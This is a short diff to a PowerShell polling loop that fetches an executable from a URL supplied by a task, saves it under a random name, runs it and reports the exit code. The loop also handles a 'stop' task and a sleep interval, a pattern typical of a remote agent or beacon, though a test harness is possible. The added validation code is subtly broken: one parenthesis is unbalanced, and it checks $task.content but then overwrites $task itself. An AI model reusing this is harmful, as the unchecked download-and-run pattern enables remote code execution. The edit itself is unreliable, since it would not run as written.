@@ -41,7 +41,7 @@ while ($true) {
             Invoke-WebRequest -Uri $task.content -OutFile (New-Item -path "$dir\$uuid.exe" -Force ) -UseBasicParsing
             $code = Execute "$dir\$uuid.exe"
             $dat = "${uuid}:${code}"
-        } elseif ($task -eq "stop") {
+        } elseif ($task.content -eq "stop") {
             exit
         } else {
             throw "Test cycle done"
@@ -50,6 +50,10 @@ while ($true) {
         Write-Output $_.Exception
         Remove-Item $dir -Force -Recurse -ErrorAction SilentlyContinue
         $dat = ""
-        Start-Sleep -Seconds $task
+        if (-Not (($task.content -as [int])) {
+            Write-Output "Invalid sleep time: $task"
+            $task = 1800
+        }
+        Start-Sleep -Seconds "$task"
     }
 }
